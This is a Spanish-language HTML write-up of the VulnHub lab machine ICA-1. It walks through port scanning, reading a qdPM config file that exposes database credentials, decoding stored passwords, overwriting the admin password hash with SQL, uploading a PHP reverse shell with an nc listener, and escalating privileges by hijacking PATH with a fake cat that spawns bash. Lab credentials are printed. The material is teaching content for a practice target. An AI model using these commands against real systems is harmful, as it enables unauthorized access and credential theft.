@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Writeup: ICA-1</title>
+  <link rel="stylesheet" href="../styles.css" />
+
+  <style>
+    .screenshot-small {
+    max-width: 700px;
+    width: 100%;
+    height: 50;
+    display: block;
+    margin: 20px auto;
+}
+
+    .code-block {
+      position: relative;
+      background: var(--bg-soft);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      margin: 1rem 0;
+    }
+
+    .code-block pre {
+      margin: 0;
+      padding: 0.75rem;
+      overflow-x: auto;
+    }
+
+    .copy-btn {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background: var(--bg);
+      color: var(--accent);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.2rem 0.5rem;
+      font-size: 0.8rem;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .copy-btn:hover {
+      background: rgba(64,255,156,0.1);
+    }
+
+    .terminal-output {
+      background: #050505;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 0.75rem;
+      overflow-x: auto;
+    }
+
+    .info-box {
+      border-left: 3px solid var(--accent);
+      padding: 0.75rem 1rem;
+      margin: 1rem 0;
+      background: var(--bg-soft);
+      border-radius: 4px;
+    }
+
+    .warning-box {
+      border-left: 3px solid #ffcc66;
+      padding: 0.75rem 1rem;
+      margin: 1rem 0;
+      background: var(--bg-soft);
+      border-radius: 4px;
+    }
+
+    .screenshot {
+      width: 100%;
+      max-width: 1000px;
+      display: block;
+      margin: 1.5rem auto;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+    }
+  </style>
+</head>
+
+<body>
+  <main class="container">
+
+    <!-- Imagen de la máquina -->
+    <section class="card">
+      <img src="img/ica/ica13.png" alt="Máquina ICA-1" class="machine-img"/>
+    </section>
+
+    <!-- Navegación -->
+    <section class="card" style="text-align:center; margin-top:2rem;">
+      <button class="nav-btn" onclick="history.back()">⬅ Volver</button>
+
+      <button class="nav-btn" onclick="window.print()">
+        ⬇ Descargar PDF
+      </button>
+
+      <button class="nav-btn" onclick="likePost()">
+        👍 Me gusta <span id="like-count">0</span>
+      </button>
+    </section>
+
+    <!-- Metadatos -->
+    <section class="card">
+      <h2>ICA-1</h2>
+
+      <p class="post-desc">
+        Plataforma: VulnHub · Dificultad: Fácil · Fecha: Agosto 2026
+      </p>
+
+      <ul class="post-tags">
+        <li>#VulnHub</li>
+        <li>#ICA-1</li>
+        <li>#fileupload</li>
+        <li>#mysql</li>
+        <li>#ssh</li>
+        <li>#reverseshell</li>
+        <li>#pathhijacking</li>
+      </ul>
+    </section>
+
+    <!-- Reconocimiento -->
+    <section class="card">
+      <h3>Reconocimiento</h3>
+
+      <p>
+        Comenzamos identificando la dirección IP de la máquina dentro de
+        nuestra red utilizando <code>arp-scan</code>:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>sudo arp-scan -I eth0 --localnet --ignoredups</code></pre>
+      </div>
+
+      <p>
+        Una vez localizada la máquina, obtenemos la dirección IP:
+      </p>
+
+      <pre><code>192.168.104.13</code></pre>
+
+      <p>
+        A continuación realizamos un escaneo completo de puertos para
+        identificar los servicios expuestos:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>nmap -p- -sS --min-rate 5000 -n -Pn -vvv 192.168.104.13 -oG allPorts
+extractPorts allPorts</code></pre>
+      </div>
+
+      <p>Resultado:</p>
+
+      <div class="terminal-output">
+        <pre><code>[*] Extracting information...
+
+[*] IP Address: 192.168.104.13
+[*] Open ports: 22,80,3306,33060
+
+[*] Ports copied to clipboard
+
+22    -> ssh
+80    -> http
+3306  -> mysql
+33060 -> mysqlx</code></pre>
+      </div>
+
+      <p>
+        Tenemos cuatro puertos abiertos. Ahora realizamos un segundo escaneo
+        más exhaustivo para identificar las versiones y ejecutar scripts
+        básicos de reconocimiento:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>nmap -p22,80,3306,33060 -sCV 192.168.104.13 -oN targeted</code></pre>
+      </div>
+
+      <p>
+        El escaneo confirma la presencia de SSH, HTTP y los servicios de
+        MySQL. El siguiente paso será revisar la aplicación web.
+      </p>
+    </section>
+
+    <!-- Enumeración web -->
+    <section class="card">
+      <h3>Enumeración</h3>
+
+      <p>
+        Accedemos al puerto <code>80</code> desde el navegador y encontramos
+        un panel de autenticación.
+      </p>
+
+      <img src="img/ica/ica.png" alt="Panel web de ICA-1" class="screenshot"/>
+
+      <p>
+        En la propia página aparece la referencia a
+        <strong>qdPM 9.2</strong>, un gestor de proyectos y tareas.
+      </p>
+
+      <p>
+        Al investigar esta versión encontramos una vulnerabilidad asociada
+        a la exposición de un archivo de configuración que contiene
+        credenciales de la base de datos.
+      </p>
+
+      <img src="img/ica/ica2.png" alt="Panel web de ICA-1" class="screenshot"/>
+
+      <h4>Exposición de databases.yml</h4>
+
+      <p>
+        El archivo vulnerable se encuentra en:
+      </p>
+
+      <pre><code>/core/config/databases.yml</code></pre>
+
+      <p>
+        Podemos descargarlo directamente:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>wget http://192.168.104.13/core/config/databases.yml
+
+cat databases.yml</code></pre>
+      </div>
+
+      <img src="img/ica/ica3.png" alt="Archivo databases.yml" class="screenshot"/>
+
+      <p>
+        Dentro del archivo encontramos las credenciales utilizadas por
+        qdPM para conectarse a MySQL:
+      </p>
+
+      <div class="terminal-output">
+        <pre><code>database: qdpm
+username: qdpmadmin
+password: UcVQCMQk2STVeS6J</code></pre>
+      </div>
+
+      <div class="info-box">
+        <strong>Hallazgo:</strong>
+        el archivo de configuración expuesto nos proporciona credenciales
+        válidas para el servicio MySQL.
+      </div>
+    </section>
+
+    <!-- Enumeración MySQL -->
+    <section class="card">
+      <h3>Enumeración de MySQL</h3>
+
+      <p>
+        Como el puerto <code>3306</code> está expuesto y disponemos de
+        credenciales válidas, intentamos conectarnos directamente al servidor
+        MySQL:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>mysql -h 192.168.104.13 -P 3306 -u qdpmadmin -p</code></pre>
+      </div>
+
+      <p>
+        Una vez dentro encontramos varias bases de datos. Entre ellas nos
+        interesan especialmente:
+      </p>
+
+      <pre><code>staff
+qdpm</code></pre>
+
+      <h4>Base de datos staff</h4>
+
+      <p>
+        Comenzamos revisando la base de datos <code>staff</code>:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>use staff;
+show tables;</code></pre>
+      </div>
+
+      <p>
+        Encontramos las tablas:
+      </p>
+
+      <pre><code>department
+login
+user</code></pre>
+
+      <p>
+        Consultamos la tabla <code>user</code>:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>select * from user;</code></pre>
+      </div>
+
+      <div class="terminal-output">
+        <pre><code>1 | 1 | Smith  | Cyber Security Specialist
+2 | 2 | Lucas  | Computer Engineer
+3 | 1 | Travis | Intelligence Specialist
+4 | 1 | Dexter | Cyber Security Analyst
+5 | 2 | Meyer  | Genetic Engineer</code></pre>
+      </div>
+
+      <p>
+        La tabla nos permite relacionar los identificadores de usuario con
+        sus nombres.
+      </p>
+
+      <p>
+        Ahora consultamos la tabla <code>login</code>:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>select * from login;</code></pre>
+      </div>
+
+      <div class="terminal-output">
+        <pre><code>1 | 2 | c3VSSkFkR3dMcDhkeTNyRg==
+2 | 4 | N1p3VjRxdGc0MmNtVVhHWA==
+3 | 1 | WDdNUWtQM1cyOWZld0hkQw==
+4 | 3 | REpjZVZ5OThXMjhZN3dMZw==
+5 | 5 | Y3FObkJXQ0J5UzJEdUpTeQ==</code></pre>
+      </div>
+
+      <p>
+        Los valores de la tercera columna parecen estar codificados en
+        Base64. Podemos decodificarlos:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>echo REpjZVZ5OThXMjhZN3dMZw== | base64 -d</code></pre>
+      </div>
+
+      <p>
+        Algunas de estas credenciales pueden reutilizarse para autenticación
+        SSH. Sin embargo, en este caso continuaremos enumerando la aplicación
+        para conseguir acceso mediante otro camino.
+      </p>
+
+      <h4>Base de datos qdpm</h4>
+
+      <p>
+        Revisamos ahora la base de datos principal de la aplicación:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>use qdpm;
+select * from configuration;</code></pre>
+      </div>
+
+      <p>
+        Encontramos información relacionada con la cuenta de administración:
+      </p>
+
+      <div class="terminal-output">
+        <pre><code>email: admin@localhost.com
+password: $P$EmesnWRcY9GrK0hDzwaV3rvQnMJ/Fx0</code></pre>
+      </div>
+
+      <img src="img/ica_3.png" alt="Credenciales encontradas en MySQL" class="screenshot"/>
+
+      <p>
+        El valor de la contraseña tiene el formato utilizado por
+        <strong>PHPass</strong>.
+      </p>
+
+      <p>
+        En lugar de intentar recuperar directamente la contraseña original,
+        aprovechamos que tenemos permisos suficientes sobre la base de datos
+        para comprobar si podemos modificar el valor almacenado.
+      </p>
+
+      <h4>Comprobación del hash PHPass</h4>
+
+      <p>
+        La aplicación dispone de una funcionalidad para restablecer la
+        contraseña. Generamos una nueva contraseña desde la propia aplicación
+        y comprobamos si el hash almacenado en la base de datos cambia.
+      </p>
+
+      <p>
+        Después de solicitar el cambio obtenemos:
+      </p>
+
+      <div class="terminal-output">
+        <pre><code>password: $P$EQeida_/QeraPidawcawij082FY01y&</code></pre>
+      </div>
+
+      <p>
+        Esto confirma que el valor almacenado corresponde a la contraseña de
+        la cuenta y que podemos generar hashes compatibles con PHPass.
+      </p>
+
+      <p>
+        Antes de modificar el registro comprobamos los privilegios del usuario
+        utilizado para acceder a MySQL:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>SHOW GRANTS FOR 'qdpmadmin'@'localhost';</code></pre>
+      </div>
+
+      <h4>Generación de un nuevo hash</h4>
+
+      <p>
+        Utilizamos Python y <code>passlib</code> para generar un hash PHPass
+        compatible:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>from passlib.hash import phpass
+
+password = "Password123!"
+hash = phpass.hash(password)
+
+print("Password:", password)
+print("Hash:", hash)</code></pre>
+      </div>
+
+      <p>
+        El hash generado para <code>Password123!</code> puede utilizarse para
+        actualizar directamente el registro de configuración:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>UPDATE qdpm.configuration
+SET value = '$P$HZSKdx0gPb32FYXS2JdxuhkabZc9nz1'
+WHERE id = 2;</code></pre>
+      </div>
+
+      <p>
+        Con la contraseña modificada podemos autenticarnos en el panel web
+        como administrador.
+      </p>
+
+      <img src="img/ica/ica4.png" alt="Acceso al panel de administración" class="screenshot"/>
+    </section>
+
+    <!-- Explotación -->
+    <section class="card">
+      <h3>Explotación</h3>
+
+      <h4>File Upload → Reverse Shell</h4>
+
+      <p>
+        Una vez dentro del panel de administración podemos aprovechar una
+        vulnerabilidad de subida de archivos asociada a
+        <strong>CVE-2023-45856</strong>.
+      </p>
+
+      <p>
+        El flujo de explotación consiste en crear primero un usuario con los
+        permisos necesarios para acceder a la funcionalidad vulnerable.
+      </p>
+
+      <img src="img/ica/ica5.png" alt="Creación de usuario" class="screenshot"/>
+
+      <p>
+        Creamos el usuario, cerramos la sesión administrativa y accedemos
+        utilizando la nueva cuenta.
+      </p>
+
+      <p>
+        Una vez autenticados navegamos hasta:
+      </p>
+
+      <pre><code>Projects → Add Project</code></pre>
+
+
+      <p>
+        Durante la creación del proyecto encontramos la sección
+        <strong>Attachment</strong>, que permite subir archivos.
+      </p>
+
+      <p>
+        El archivo subido termina almacenándose en la ruta:
+      </p>
+
+      <pre><code>/uploads</code></pre>
+
+      <p>
+        Debido a la vulnerabilidad, podemos utilizar esta funcionalidad para
+        subir una reverse shell en PHP.
+      </p>
+
+      <img src="img/ica/ica7.png" alt="Subida de reverse shell" class="screenshot"/>
+
+      <p>
+        Una vez subida la reverse shell, accedemos a la ruta correspondiente
+        para provocar su ejecución.
+      </p>
+
+      <img src="img/ica/ica8.png" alt="Ejecución de la reverse shell" class="screenshot"/>
+
+      <p>
+        En nuestra máquina atacante ponemos un listener:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>nc -lnvp 443</code></pre>
+      </div>
+
+      <p>
+        Al acceder al archivo recibimos una conexión como
+        <code>www-data</code>.
+      </p>
+
+      <div class="terminal-output">
+        <pre><code>www-data@ica:~$</code></pre>
+      </div>
+
+      <p>
+        Enumeramos los directorios personales:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>ls /home</code></pre>
+      </div>
+
+      <p>Encontramos dos usuarios:</p>
+
+      <pre><code>dexter
+travis</code></pre>
+    </section>
+
+    <!-- Movimiento lateral -->
+    <section class="card">
+      <h3>Movimiento lateral</h3>
+
+      <p>
+        Durante la enumeración anterior habíamos encontrado credenciales
+        asociadas a los usuarios del sistema. Para el usuario
+        <code>travis</code> tenemos:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>echo REpjZVZ5OThXMjhZN3dMZw== | base64 -d</code></pre>
+      </div>
+
+      <p>Obtenemos:</p>
+
+      <pre><code>DJceVy98W28Y7wLg</code></pre>
+
+      <p>
+        Utilizamos esta contraseña para cambiar al usuario
+        <code>travis</code>:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>su travis</code></pre>
+      </div>
+
+      <img src="img/ica/ica9.png" alt="Acceso como Travis" class="screenshot"/>
+
+      <p>
+        Para trabajar con una terminal más interactiva podemos realizar el
+        siguiente proceso de estabilización:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>script /dev/null -c bash
+
+CTRL + Z
+
+stty raw -echo; fg
+
+reset xterm
+
+export TERM=xterm
+export SHELL=bash
+
+stty rows 44 columns 184</code></pre>
+      </div>
+
+      <p>
+        Finalmente encontramos la primera flag:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>cat user.txt</code></pre>
+      </div>
+
+      <div class="terminal-output">
+        <pre><code>flag1 -> ICA{Secret_Project}</code></pre>
+      </div>
+    </section>
+
+    <!-- Escalada -->
+    <section class="card">
+      <h3>Escalada de privilegios</h3>
+
+      <h4>Análisis del binario get_access</h4>
+
+      <p>
+        Durante la enumeración encontramos un binario llamado
+        <code>get_access</code>.
+      </p>
+
+      <img src="img/ica/ica10.png" alt="Binario get_access" class="screenshot"/>
+
+      <p>
+        Al ejecutarlo no obtenemos un resultado especialmente útil. El
+        comportamiento del programa hace referencia a una comprobación
+        relacionada con la zona horaria.
+      </p>
+
+      <p>
+        Continuamos investigando el usuario <code>dexter</code>. Dentro de su
+        directorio personal encontramos una nota relacionada con los binarios.
+      </p>
+
+      <img src="img/ica/ica11.png" alt="Nota encontrada en el home de Dexter" class="screenshot"/>
+
+      <p>
+        La nota nos da una pista para analizar el contenido del binario
+        mediante <code>strings</code>:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>strings get_access</code></pre>
+      </div>
+
+      <p>
+        Entre las cadenas obtenidas encontramos una especialmente interesante:
+      </p>
+
+      <pre><code>cat /root/system.info</code></pre>
+
+      <p>
+        El binario está ejecutando <code>cat</code> mediante una ruta relativa
+        en lugar de utilizar una ruta absoluta como
+        <code>/bin/cat</code>.
+      </p>
+
+      <div class="info-box">
+        <strong>Hallazgo:</strong>
+        al utilizar <code>cat</code> sin una ruta absoluta, el sistema buscará
+        el ejecutable siguiendo el orden definido en la variable
+        <code>PATH</code>.
+      </div>
+
+      <h4>PATH Hijacking</h4>
+
+      <p>
+        Primero comprobamos el valor actual de la variable
+        <code>PATH</code>:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>echo "$PATH"</code></pre>
+      </div>
+
+      <div class="terminal-output">
+        <pre><code>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</code></pre>
+      </div>
+
+      <p>
+        Podemos modificar la variable para añadir nuestro propio directorio
+        al principio del <code>PATH</code>:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>export PATH="/tmp:$PATH"
+
+echo "$PATH"</code></pre>
+      </div>
+
+      <div class="terminal-output">
+        <pre><code>/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</code></pre>
+      </div>
+
+      <p>
+        Ahora creamos en <code>/tmp</code> un ejecutable llamado
+        <code>cat</code>. Debido al orden de búsqueda del
+        <code>PATH</code>, nuestro archivo será encontrado antes que el
+        <code>cat</code> legítimo del sistema.
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>cd /tmp
+nano cat</code></pre>
+      </div>
+
+      <p>
+        Dentro del archivo colocamos:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>/bin/bash</code></pre>
+      </div>
+
+      <p>
+        A continuación hacemos que el archivo sea ejecutable:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>chmod +x /tmp/cat</code></pre>
+      </div>
+
+      <p>
+        Finalmente ejecutamos el binario vulnerable:
+      </p>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>/opt/get_access</code></pre>
+      </div>
+
+      <img src="img/ica/ica12.png" alt="Explotación mediante PATH Hijacking" class="screenshot"/>
+
+      <p>
+        Cuando <code>get_access</code> intenta ejecutar
+        <code>cat /root/system.info</code>, encuentra primero nuestro
+        <code>/tmp/cat</code>. En lugar de ejecutar el comando original,
+        se ejecuta <code>/bin/bash</code>, obteniendo así una shell con los
+        privilegios con los que se ejecuta el binario.
+      </p>
+
+      <div class="info-box">
+        <strong>PATH Hijacking:</strong>
+        la vulnerabilidad se produce porque el binario utiliza comandos sin
+        especificar su ruta absoluta y el atacante puede controlar el
+        contenido de un directorio situado al principio de
+        <code>PATH</code>.
+      </div>
+
+      <p>
+        De esta forma conseguimos completar la escalada de privilegios de la
+        máquina.
+      </p>
+    </section>
+
+    <!-- Resumen -->
+    <section class="card">
+      <h3>Resumen de la cadena de ataque</h3>
+
+      <ol>
+        <li>Descubrimiento de la máquina mediante <code>arp-scan</code>.</li>
+        <li>Enumeración de puertos con <code>nmap</code>.</li>
+        <li>Identificación de qdPM 9.2 en el puerto HTTP.</li>
+        <li>Exposición del archivo <code>databases.yml</code>.</li>
+        <li>Obtención de credenciales para MySQL.</li>
+        <li>Enumeración de las bases de datos <code>staff</code> y <code>qdpm</code>.</li>
+        <li>Obtención de credenciales codificadas en Base64.</li>
+        <li>Identificación del hash PHPass del usuario administrador.</li>
+        <li>Modificación de la contraseña del administrador mediante MySQL.</li>
+        <li>Acceso al panel de administración de qdPM.</li>
+        <li>Explotación del file upload para subir una reverse shell.</li>
+        <li>Obtención de acceso como <code>www-data</code>.</li>
+        <li>Reutilización de credenciales para acceder como <code>travis</code>.</li>
+        <li>Obtención de la flag de usuario.</li>
+        <li>Análisis del binario <code>get_access</code>.</li>
+        <li>Identificación del uso de <code>cat</code> mediante una ruta relativa.</li>
+        <li>Explotación mediante <strong>PATH Hijacking</strong>.</li>
+        <li>Obtención de una shell con privilegios elevados.</li>
+      </ol>
+    </section>
+
+    <!-- Comentarios -->
+    <section class="card" style="margin-top:2rem;">
+      <h3>Comentarios</h3>
+
+      <textarea
+        id="comment-input"
+        placeholder="Escribe tu comentario..."
+        class="comment-box"></textarea>
+
+      <br/>
+      <br/>
+
+      <button class="nav-btn" onclick="addComment()">
+        Enviar comentario
+      </button>
+
+      <ul
+        id="comment-list"
+        style="margin-top:1rem; text-align:left;">
+      </ul>
+    </section>
+
+  </main>
+
+  <script>
+    // --- Copiar código ---
+    function copyCode(button) {
+      const code = button.parentElement.querySelector("code").innerText;
+
+      navigator.clipboard.writeText(code).then(() => {
+        const originalText = button.textContent;
+        button.textContent = "¡Copiado!";
+
+        setTimeout(() => {
+          button.textContent = originalText;
+        }, 1200);
+      });
+    }
+
+    // --- Likes ---
+    let likes = parseInt(localStorage.getItem("likes") || "0");
+
+    document.getElementById("like-count").textContent = likes;
+
+    function likePost() {
+      likes++;
+
+      document.getElementById("like-count").textContent = likes;
+
+      localStorage.setItem("likes", likes);
+    }
+
+    // --- Comentarios ---
+    function addComment() {
+      const input = document.getElementById("comment-input");
+      const text = input.value.trim();
+
+      if (text !== "") {
+        const li = document.createElement("li");
+
+        li.textContent = text;
+
+        document
+          .getElementById("comment-list")
+          .appendChild(li);
+
+        let comments = JSON.parse(
+          localStorage.getItem("comments") || "[]"
+        );
+
+        comments.push(text);
+
+        localStorage.setItem(
+          "comments",
+          JSON.stringify(comments)
+        );
+
+        input.value = "";
+      }
+    }
+
+    // --- Cargar comentarios ---
+    window.onload = () => {
+      const savedComments = JSON.parse(
+        localStorage.getItem("comments") || "[]"
+      );
+
+      savedComments.forEach(comment => {
+        const li = document.createElement("li");
+
+        li.textContent = comment;
+
+        document
+          .getElementById("comment-list")
+          .appendChild(li);
+      });
+    };
+  </script>
+
+</body>
+</html>
